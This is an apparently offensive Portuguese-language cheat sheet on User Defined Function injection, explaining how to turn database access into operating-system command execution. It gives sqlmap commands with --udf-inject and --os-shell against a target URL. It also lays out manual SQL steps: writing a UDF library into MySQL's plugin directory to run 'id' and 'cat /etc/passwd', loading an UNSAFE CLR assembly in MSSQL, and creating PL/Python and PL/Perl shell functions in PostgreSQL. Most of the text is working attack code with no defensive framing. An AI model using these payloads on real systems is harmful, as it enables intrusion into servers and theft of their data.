# Injeção UDF (User Defined Functions)

## O que é UDF

User Defined Functions permitem criar funções customizadas no banco de dados, incluindo funções que executam comandos do sistema operacional.

## MySQL UDF

### Pré-requisitos
- Permissão de escrita no diretório de plugins
- Privilégio `FILE` e `CREATE FUNCTION`
- `secure_file_priv` = ""

```bash
# SQLMap faz isso automaticamente
sqlmap -u "http://alvo.com/?id=1" \
  --udf-inject \
  --shared-lib=/path/to/udf.so \
  --batch
```

### UDF Nativo do SQLMap

```bash
# SQLMap carrega automaticamente a UDF da sua biblioteca
sqlmap -u "http://alvo.com/?id=1" \
  --dbms=mysql \
  --os-shell \
  --batch
# SQLMap tenta: UDF → INTO OUTFILE → xp_cmdshell
```

### Processo Manual
```sql
-- 1. Encontrar diretório de plugins
SHOW VARIABLES LIKE 'plugin_dir';

-- 2. Escrever biblioteca UDF (arquivo .so/.dll como hex)
SELECT 0x7f454c46... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- 3. Criar função
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';

-- 4. Executar comandos
SELECT sys_exec('id');
SELECT sys_eval('cat /etc/passwd');

-- 5. Limpar
DROP FUNCTION sys_exec;
DROP FUNCTION sys_eval;
```

## MSSQL — CLR Assembly

```sql
-- Criar assembly CLR com execução de comandos
-- Requer TRUSTWORTHY ON ou permissão UNSAFE ASSEMBLY

-- Habilitar CLR
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;

-- Carregar assembly
CREATE ASSEMBLY CmdExec
FROM 0x4d5a900003...  -- hex da DLL
WITH PERMISSION_SET = UNSAFE;

-- Criar stored procedure
CREATE PROCEDURE cmd_exec (@command NVARCHAR(4000))
AS EXTERNAL NAME CmdExec.StoredProcedures.cmd_exec;

-- Executar
EXEC cmd_exec 'whoami';
```

## PostgreSQL — PL/Python / PL/Perl

```sql
-- PL/Python (se disponível)
CREATE OR REPLACE FUNCTION exec_cmd(cmd text) RETURNS text AS $$
import subprocess
return subprocess.check_output(cmd, shell=True, text=True)
$$ LANGUAGE plpython3u;

SELECT exec_cmd('id');

-- PL/Perl
CREATE OR REPLACE FUNCTION exec_cmd(cmd text) RETURNS text AS $$
return `$_[0]`;
$$ LANGUAGE plperlu;
```

## Indicadores de Sucesso

```bash
# SQLMap: UDF injetado com sucesso
[INFO] UDF 'sys_exec' already exists
[INFO] using UDF 'sys_exec' for OS command execution
```
